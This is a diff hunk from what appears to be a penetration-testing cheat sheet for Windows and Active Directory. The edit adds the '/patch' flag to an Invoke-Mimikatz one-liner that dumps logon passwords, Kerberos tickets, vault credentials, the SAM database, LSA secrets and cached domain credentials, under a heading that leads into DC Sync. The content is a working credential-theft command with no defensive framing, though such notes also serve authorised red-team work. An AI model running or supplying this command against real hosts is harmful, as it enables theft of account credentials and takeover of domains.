@@ -186,7 +186,7 @@ Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "vault::cred /patc
 
 #### Mimikatz dump all to find privs
 ```
-Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "sekurlsa::tickets /export" "kerberos::list /export" "vault::cred" "vault::list" "lsadump::sam" "lsadump::secrets" "lsadump::cache"'
+Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "sekurlsa::tickets /export" "kerberos::list /export" "vault::cred /patch" "vault::list" "lsadump::sam" "lsadump::secrets" "lsadump::cache"'
 ```
 
 ## DC Sync
